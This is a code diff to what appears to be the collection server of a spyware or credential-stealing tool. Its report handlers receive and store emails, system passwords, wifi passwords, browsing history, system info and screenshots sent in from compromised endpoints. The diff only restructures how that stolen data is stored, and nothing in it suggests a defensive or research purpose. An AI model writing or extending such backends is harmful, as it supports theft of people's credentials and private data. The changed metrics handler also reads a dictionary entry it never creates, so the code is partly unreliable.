@@ -57,19 +57,23 @@ def receive_full_report():
                     store.endpoint_history[endpoint_id]['history'].extend(b_data['history'])
         
         if report_data.get('emails'):
-            if endpoint_id not in store.endpoint_emails: store.endpoint_emails[endpoint_id] = {'emails': []}
-            store.endpoint_emails[endpoint_id]['emails'].extend(report_data['emails'])
+            if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
+            if 'emails' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['emails'] = []
+            store.endpoints[endpoint_id]['emails'].extend(report_data['emails'])
             
         if report_data.get('system_passwords'):
-            if endpoint_id not in store.endpoint_system_passwords: store.endpoint_system_passwords[endpoint_id] = {'passwords': []}
-            store.endpoint_system_passwords[endpoint_id]['passwords'].extend(report_data['system_passwords'])
+            if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
+            if 'system_passwords' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['system_passwords'] = []
+            store.endpoints[endpoint_id]['system_passwords'].extend(report_data['system_passwords'])
             
         if report_data.get('wifi_passwords'):
-            if endpoint_id not in store.endpoint_wifi_passwords: store.endpoint_wifi_passwords[endpoint_id] = {'passwords': []}
-            store.endpoint_wifi_passwords[endpoint_id]['passwords'].extend(report_data['wifi_passwords'])
+            if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
+            if 'wifi_passwords' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['wifi_passwords'] = []
+            store.endpoints[endpoint_id]['wifi_passwords'].extend(report_data['wifi_passwords'])
             
         if 'system_info' in report_data:
-            store.endpoint_system_info[endpoint_id] = report_data['system_info']
+            if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
+            store.endpoints[endpoint_id]['system_info'] = report_data['system_info']
             
         if report_data.get('screenshot'):
             store.endpoint_screenshots[endpoint_id] = {
@@ -192,8 +196,8 @@ def receive_metrics():
         endpoint_id = data.get('endpoint_id', 'unknown')
         metrics = data.get('metrics', {})
         if endpoint_id:
-            store.metrics_data.append({
-                'endpoint_id': endpoint_id,
+            if 'metrics' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['metrics'] = []
+            store.endpoints[endpoint_id]['metrics'].append({
                 'metrics': metrics,
                 'timestamp': datetime.now().isoformat()
             })
